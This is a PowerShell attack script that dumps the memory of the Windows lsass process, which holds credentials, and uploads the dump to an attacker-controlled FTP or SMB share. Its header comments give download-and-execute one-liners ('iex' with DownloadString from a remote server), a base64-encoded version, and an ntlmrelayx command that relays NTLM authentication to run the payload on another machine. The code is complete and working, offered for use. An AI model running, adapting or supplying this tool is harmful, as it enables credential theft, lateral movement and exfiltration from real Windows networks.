#
# It does dump the lsass process memory and sends it to your smb/ftp.  Resulting file name like computername.domain.dmp
# Use it: powershell -nop -c "iex(NEW-Object Net.WebClient).DownloadString('ftp://server/share/remotepd.ps1')"
#
#  Base64 for Windows in linux: echo your_string | iconv —to-code UTF-16LE | base64 -w 0
#  powershell   -nop -c  -Enc "iex(NEW-Object Net.WebClient).DownloadString('http://yourserver/remotepd.ps1')"'
#  ntlmrelayx.py --no-http-server -smb2support -t msedgewin10 -c 'powershell  -Enc aQBlAHgAKABOAEUAVwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHkAbwB1AHIAcwBlAHIAdgBlAHIALwByAGUAbQBvAHQAZQBwAGQALgBwAHMAMQAnACkACgA='
#  You must set:
#     $local - directory where you have write rights
#     $dest - path to your smb share or ftp server
#
# getdmp is geted from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

$local = 'c:\Temp'
$dest= "ftp://servers/share"


function getdmp
{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PWD
    )

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}


$webclient = New-Object System.Net.WebClient

$a=Get-Process lsass | getdmp -DumpFilePath $local
$dumpname = "$env:COMPUTERNAME.$env:USERDOMAIN.dump"
Foreach ($file in $a){
Write-Host "Upload? "$file
    if ($file -like '*lsass_*'){
        Write-Host "Upload "$file" like "$dumpname
        if ($dest.Substring(0,3) -eq 'ftp')
            {
            Write-Host "Use FTP"
            try {

                $WebClient.UploadFile($dest+"/"+$dumpname, $file) 
                Write-Host "File "$dumpname" uploaded"
                }
            catch
                {
                    Write-Host "Upload file error "$file
                    Write-Host $error[0].Exception
                }
            }
        if ($dest.Substring(0,2) -eq '//')
            {
            Write-Host "Use SMB"
            try 
                {
                Copy-Item -Path $file -Destination $dest"/"$dumpname -Force
                Write-Host "File "$dumpname" uploaded"                            
                }    
               
            catch
                {
                    Write-Host "Upload file error "$file
                    Write-Host $error[0].Exception
                }
            }        
        Remove-Item $file
    }
}
